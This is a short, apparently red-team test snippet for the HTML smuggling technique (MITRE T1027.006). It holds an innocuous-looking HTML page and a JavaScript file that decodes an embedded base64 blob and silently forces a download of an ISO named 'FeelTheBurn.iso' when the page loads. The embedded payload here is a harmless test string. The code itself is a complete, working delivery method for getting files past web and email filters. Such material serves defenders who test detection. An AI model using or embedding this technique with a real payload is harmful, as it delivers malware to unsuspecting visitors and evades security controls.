Create an html page to include a javascript file to have an embedded iso downloaded

index.html file
```html
<html>
    <head>
        <title>T1027.006 - HTML Smuggling</title>
    </head>
    <body>
        <p>Nothing to see here...</p>
        <script type"text/javascript" src="my.js"></script>
    </body>
</html>
```

my.js file that holds the base64 encoded file
```javascript
function convertFromBase64(base64) {
	var binary_string = window.atob(base64);
	var len = binary_string.length;
	var bytes = new Uint8Array( len );
	for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
	return bytes.buffer;
}

var file ='dGVzdGluZwo=';
var data = convertFromBase64(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'FeelTheBurn.iso';
var a = document.createElement('a');
var url = window.URL.createObjectURL(blob);
document.body.appendChild(a);
a.style = 'display: none';
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
```